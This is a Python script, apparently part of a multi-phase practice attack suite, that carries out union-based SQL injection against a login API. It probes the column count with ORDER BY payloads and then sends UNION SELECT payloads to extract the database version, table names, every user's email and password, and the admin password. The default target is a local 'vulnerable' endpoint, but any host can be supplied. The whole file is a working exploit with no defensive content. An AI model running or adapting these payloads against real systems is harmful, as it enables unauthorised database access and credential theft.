#!/usr/bin/env python3
"""Phase 3: Union-Based SQL Injection - Data Extraction"""

import requests
import argparse


class Phase3UnionBased:
    def __init__(self, target="http://localhost:5001"):
        self.target = target
        self.extracted = {}

    def union_attack(self, name, payload):
        try:
            data = {"username": payload, "password": "test"}
            response = requests.post(
                f"{self.target}/api/vulnerable/login",
                json=data,
                timeout=5
            )

            if response.status_code == 200:
                try:
                    resp = response.json()
                    print(f"  ✅ {name}")
                    self.extracted[name] = resp
                    return True
                except:
                    pass

            print(f"  ❌ {name}")
            return False
        except Exception as e:
            print(f"  ❌ {name} - Error: {str(e)}")
            return False

    def run(self):
        print("\n" + "="*70)
        print("PHASE 3: UNION-BASED SQL INJECTION")
        print("="*70)
        print(f"Target: {self.target}\n")

        print("Step 1: Finding column count...")
        for i in range(1, 12):
            payload = f"' ORDER BY {i} --"
            try:
                data = {"username": payload, "password": "test"}
                r = requests.post(
                    f"{self.target}/api/vulnerable/login", json=data, timeout=5)
                if r.status_code != 200:
                    col_count = i - 1
                    print(f"  ✅ Column count: {col_count}")
                    break
            except:
                col_count = 9
                break
        print()

        print("Step 2: Extracting database info...")
        tests = [
            ("MySQL Version",
             f"' UNION SELECT @@version, {', '.join(['NULL']*(col_count-1))} --"),
            ("Database Name",
             f"' UNION SELECT database(), {', '.join(['NULL']*(col_count-1))} --"),
            ("Current User",
             f"' UNION SELECT user(), {', '.join(['NULL']*(col_count-1))} --"),
            ("All Tables",
             f"' UNION SELECT table_name, {', '.join(['NULL']*(col_count-1))} FROM information_schema.tables WHERE table_schema=database() --"),
            ("All Users",
             f"' UNION SELECT id, username, email, password, {', '.join(['NULL']*(col_count-5))} FROM Users --"),
            ("Admin Password",
             f"' UNION SELECT id, username, email, password, {', '.join(['NULL']*(col_count-5))} FROM Users WHERE role='admin' --"),
        ]

        for name, payload in tests:
            self.union_attack(name, payload)
            print()

        print("="*70)
        print(f"✅ Phase 3 Complete: {len(self.extracted)} items extracted")
        print("="*70)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:5001")
    args = parser.parse_args()
    phase = Phase3UnionBased(target=args.target)
    phase.run()
